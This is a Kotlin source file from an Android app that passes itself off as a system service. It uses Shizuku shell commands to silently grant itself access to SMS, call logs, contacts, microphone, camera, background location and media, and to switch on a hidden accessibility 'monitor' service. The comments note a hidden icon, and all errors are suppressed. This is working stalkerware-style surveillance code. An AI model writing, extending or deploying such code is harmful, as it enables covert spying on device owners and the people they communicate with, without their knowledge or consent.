package com.system.service.core

import android.content.Context
import android.content.pm.PackageManager
import rikka.shizuku.Shizuku

object ShizukuManager {

    private val allPermissions = listOf(
        "android.permission.READ_CALL_LOG",
        "android.permission.READ_CONTACTS",
        "android.permission.READ_SMS",
        "android.permission.RECEIVE_SMS",
        "android.permission.RECORD_AUDIO",
        "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.ACCESS_BACKGROUND_LOCATION",
        "android.permission.CAMERA",
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.READ_MEDIA_IMAGES",
        "android.permission.READ_MEDIA_VIDEO",
        "android.permission.READ_MEDIA_AUDIO",
        "android.permission.PACKAGE_USAGE_STATS",
        "android.permission.ACCESS_WIFI_STATE",
        "android.permission.READ_PHONE_STATE"
    )

    fun isShizukuAvailable(): Boolean {
        return try {
            Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED
        } catch (_: Exception) { false }
    }

    /**
     * Shizuku ke zariye saari permissions silently grant karo.
     * Shizuku pehle se install + running hona chahiye (Sui ya Manager).
     * Returns: granted count
     */
    fun grantAllPermissions(context: Context): Int {
        if (!isShizukuAvailable()) return 0
        var granted = 0
        val pkg = context.packageName
        for (perm in allPermissions) {
            try {
                Shizuku.newProcess(
                    arrayOf("pm", "grant", pkg, perm), null, null
                ).waitFor()
                granted++
            } catch (_: Exception) {}
        }
        // Hiden icon — accessibility auto-enable try
        try {
            Shizuku.newProcess(
                arrayOf("settings", "put", "secure",
                    "enabled_accessibility_services",
                    "$pkg/com.system.service.monitors.AccessibilityMonitor"),
                null, null
            ).waitFor()
        } catch (_: Exception) {}
        return granted
    }

    fun requestShizukuPermission() {
        try {
            if (Shizuku.shouldShowRequestPermissionRationale()) return
            Shizuku.requestPermission(101)
        } catch (_: Exception) {}
    }
}
